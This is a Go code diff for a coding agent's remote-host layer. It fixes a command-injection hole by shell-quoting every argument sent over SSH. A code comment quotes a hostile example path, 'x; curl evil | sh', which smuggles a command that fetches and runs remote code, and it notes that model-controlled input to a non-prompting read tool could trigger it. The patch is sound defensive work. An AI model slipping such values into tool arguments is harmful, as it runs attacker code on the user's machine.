@@ -44,14 +44,34 @@ func (h *remoteHost) argv(ctx context.Context, stdin io.Reader, args ...string) 
 	var cmd *exec.Cmd
 	switch h.kind {
 	case "docker":
+		// docker exec passes argv straight to the container: no remote
+		// shell parses it, so the words go through as they are.
 		a := append([]string{"exec", "-i", h.target}, args...)
 		cmd = exec.CommandContext(ctx, "docker", a...)
 	default:
-		a := append(sshArgs(h.target), args...)
+		a := append(sshArgs(h.target), h.remoteWords(args)...)
 		cmd = exec.CommandContext(ctx, "ssh", a...)
 	}
 	cmd.Stdin = stdin
 	return cmd.CombinedOutput()
+}
+
+// remoteWords makes argv safe for the remote shell. The SSH exec protocol
+// carries a single command string: the client joins the words after the
+// target with spaces and the remote login shell parses the result. A
+// model-controlled path like "x; curl evil | sh" would otherwise be
+// reparsed as shell syntax, and read_file is a read-only tool that never
+// prompts. Quoting every word makes each one opaque; the remote shell
+// hands the tool exactly the bytes janetcode meant.
+func (h *remoteHost) remoteWords(args []string) []string {
+	if h.kind == "docker" {
+		return args
+	}
+	quoted := make([]string, len(args))
+	for i, a := range args {
+		quoted[i] = shQuote(a)
+	}
+	return quoted
 }
 
 func (h *remoteHost) ReadFile(ctx context.Context, path string) ([]byte, error) {
@@ -177,7 +197,7 @@ func (h *remoteHost) Command(ctx context.Context, command string) (*exec.Cmd, er
 	case "docker":
 		cmd = exec.CommandContext(ctx, "docker", "exec", "-i", "-w", h.root, h.target, "bash", "-lc", command)
 	default:
-		cmd = exec.CommandContext(ctx, "ssh", append(sshArgs(h.target), "bash", "-lc", script)...)
+		cmd = exec.CommandContext(ctx, "ssh", append(sshArgs(h.target), h.remoteWords([]string{"bash", "-lc", script})...)...)
 	}
 	cmd.Env = shell.ScrubEnv(os.Environ())
 	shell.SetProcessGroup(cmd)
@@ -248,7 +268,10 @@ func DialSSH(spec string) (Host, error) {
 		path = pwd
 	} else if strings.HasPrefix(path, "~") {
 		home := pwd
-		if homeOut, herr := exec.CommandContext(ctx, "ssh", append(sshArgs(target), "printf", "%s", "$HOME")...).CombinedOutput(); herr == nil && strings.TrimSpace(string(homeOut)) != "" {
+		// Quoting every remote word means the expansion has to happen on
+		// the far side: one script word, expanded by the remote sh.
+		probe := exec.CommandContext(ctx, "ssh", append(sshArgs(target), "sh", "-c", shQuote(`printf %s "$HOME"`))...)
+		if homeOut, herr := probe.CombinedOutput(); herr == nil && strings.TrimSpace(string(homeOut)) != "" {
 			home = strings.TrimSpace(string(homeOut))
 		}
 		path = home + strings.TrimPrefix(path, "~")
